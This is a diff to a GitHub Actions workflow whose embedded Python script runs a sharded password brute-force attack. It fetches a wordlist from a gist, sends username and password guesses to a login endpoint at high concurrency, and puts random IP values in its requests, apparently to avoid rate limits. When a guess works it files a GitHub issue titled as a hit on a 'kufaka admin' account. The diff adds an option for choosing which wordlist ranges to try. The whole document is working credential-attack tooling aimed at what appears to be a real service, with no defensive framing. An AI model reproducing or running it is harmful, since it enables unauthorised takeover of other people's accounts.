@@ -8,6 +8,7 @@ on:
       rate:    {description: rate,    required: false, type: string, default: "7"}
       conc:    {description: conc,    required: false, type: string, default: "8"}
       maxsec:  {description: maxsec,  required: false, type: string, default: "17000"}
+      ranges:  {description: ranges,  required: false, type: string, default: ""}
       dicturl: {description: dicturl, required: false, type: string, default: "https://gist.githubusercontent.com/firstwxx1/e1cd727ccf10f9bec3c95f11e4c01f97/raw/00b88e5c593b81b01f1a6017b8f1c0c0fdca744d/dict.txt"}
 permissions:
   contents: read
@@ -32,6 +33,7 @@ jobs:
           RATE: ${{ inputs.rate }}
           CONC: ${{ inputs.conc }}
           MAXSEC: ${{ inputs.maxsec }}
+          RANGES: ${{ inputs.ranges }}
           SHARD: ${{ matrix.shard }}
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           REPO: ${{ github.repository }}
@@ -42,6 +44,7 @@ jobs:
 
           START=int(os.environ.get("START","102367"))
           END=int(os.environ.get("END","309915"))
+          RANGES=os.environ.get("RANGES","").strip()
           NSHARD=int(os.environ.get("NSHARD","20"))
           SHARD=int(os.environ.get("SHARD","0"))
           RATE=float(os.environ.get("RATE","7"))
@@ -69,15 +72,36 @@ jobs:
 
           words=[w.rstrip("\n") for w in open(DICT,encoding="utf-8",errors="ignore") if w.strip()]
           total=len(words)
-          size=(END-START+NSHARD-1)//NSHARD
-          lo=START+SHARD*size
-          hi=min(END,lo+size)
-          TOTAL=(hi-lo)*NU
-          print("dict_total=%d shard=%d/%d words=[%d,%d) n=%d TOTAL_TASKS=%d (users per word=%d) rate=%s conc=%d users=%s"%(total,SHARD,NSHARD,lo,hi,hi-lo,TOTAL,NU,RATE,CONC,USERS),flush=True)
-          if lo>=hi:
+          UNION=None
+          if RANGES:
+              UNION=[]
+              for part in RANGES.split(","):
+                  part=part.strip()
+                  if not part: continue
+                  if "-" in part:
+                      a,b=part.split("-",1); a=int(a); b=int(b)
+                  else:
+                      a=int(part); b=a+1
+                  if a<0: a=0
+                  if b>total: b=total
+                  if b>a: UNION.extend(range(a,b))
+          if UNION is not None:
+              N=len(UNION)
+              size=(N+NSHARD-1)//NSHARD
+              lo=SHARD*size; hi=min(N,lo+size)
+          else:
+              size=(END-START+NSHARD-1)//NSHARD
+              lo=START+SHARD*size; hi=min(END,lo+size)
+          NSEL=hi-lo
+          TOTAL=NSEL*NU
+          def widx(p):
+              if total<=0: return 0
+              if UNION is None: return min(max(p,0),total-1)
+              if not UNION: return 0
+              return UNION[min(max(p,0),len(UNION)-1)]
+          print("dict_total=%d shard=%d/%d sel=[%d,%d) nsel=%d TOTAL_TASKS=%d (users per word=%d) rate=%s conc=%d ranges=%s users=%s"%(total,SHARD,NSHARD,lo,hi,NSEL,TOTAL,NU,RATE,CONC,(RANGES or "none"),USERS),flush=True)
+          if NSEL<=0:
               print("RESULT shard=%d EMPTY"%SHARD); sys.exit(0)
-          if total!=309915:
-              print("WARN dict_total mismatch expected 309915",flush=True)
 
           _rng=random.Random(int(time.time())^os.getpid()^SHARD)
           def rip(): return "%d.%d.%d.%d"%(_rng.randint(1,223),_rng.randint(0,255),_rng.randint(0,255),_rng.randint(1,254))
@@ -99,9 +123,9 @@ jobs:
               if ("token" in low or "access_token" in low) and "用户名或密码不正确" not in b: return "hit"
               return "other"
 
-          # word-major: task t -> word = lo + t//NU ; user = USERS[t%NU]
+          # word-major: task t -> word = widx(lo + t//NU) ; user = USERS[t%NU]
           def attempt(t):
-              wi=lo + t//NU; u=USERS[t%NU]; w=words[wi]; ip=rip()
+              wi=widx(lo + t//NU); u=USERS[t%NU]; w=words[wi]; ip=rip()
               body=json.dumps({"username":u,"password":w}).encode()
               req=urllib.request.Request(URL,data=body,method="POST")
               req.add_header("Content-Type","application/json")
@@ -129,7 +153,7 @@ jobs:
                   last=cat; b=bb
                   if cat in ("hit","miss","apperr","other"): return (cat,b,t,u,w)
                   time.sleep(0.35+0.45*k)
-              return (last,b,t,USERS[t%NU],words[lo+t//NU])
+              return (last,b,t,USERS[t%NU],words[widx(lo+t//NU)])
 
           lock=threading.Lock(); cnt={}
           t0=time.time(); lastrep=[0.0]
@@ -142,7 +166,7 @@ jobs:
               if cat=="hit":
                   with lock: HITTED[0]=True
                   print("!!! HIT t=%d user=%s pass=%s resp=%s"%(t,u,w,b),flush=True)
-                  issue("HIT kufaka admin %s:%s"%(u,w),"t=%d word_idx=%d user=%s pass=%s\n\n%s"%(t,lo+t//NU,u,w,b))
+                  issue("HIT kufaka admin %s:%s"%(u,w),"t=%d word_idx=%d user=%s pass=%s\n\n%s"%(t,widx(lo+t//NU),u,w,b))
               elif cat=="err":
                   failed.append(t)
               with lock:
@@ -153,7 +177,7 @@ jobs:
               if now-lastrep[0]>25:
                   lastrep[0]=now; el=now-t0
                   cov=front[0]
-                  print("PROG shard=%d t_front=%d covered_t=%d TOTAL=%d word=%d rate=%.2f/s counts=%s"%(SHARD,front[0],cov,TOTAL,lo+cov//NU,cov/max(el,1),dict(cnt)),flush=True)
+                  print("PROG shard=%d t_front=%d covered_t=%d TOTAL=%d word=%d rate=%.2f/s counts=%s"%(SHARD,front[0],cov,TOTAL,widx(lo+cov//NU),cov/max(el,1),dict(cnt)),flush=True)
 
           with concurrent.futures.ThreadPoolExecutor(max_workers=CONC) as ex:
               pend={}; k=0
@@ -173,7 +197,7 @@ jobs:
               for fu in pend: fu.cancel()
 
           el=time.time()-t0
-          print("RESULT shard=%d t_front=%d words=[%d,%d) covered_t=%d TOTAL=%d elapsed=%.0fs rate=%.2f/s counts=%s failed=%d"%(SHARD,front[0],lo,hi,front[0],TOTAL,el,front[0]/max(el,1),dict(cnt),len(failed)),flush=True)
+          print("RESULT shard=%d t_front=%d sel=[%d,%d) covered_t=%d TOTAL=%d elapsed=%.0fs rate=%.2f/s counts=%s failed=%d"%(SHARD,front[0],lo,hi,front[0],TOTAL,el,front[0]/max(el,1),dict(cnt),len(failed)),flush=True)
           if failed: print("FAILED_T %s"%(",".join(str(x) for x in failed[:50])),flush=True)
 
           PYEOF
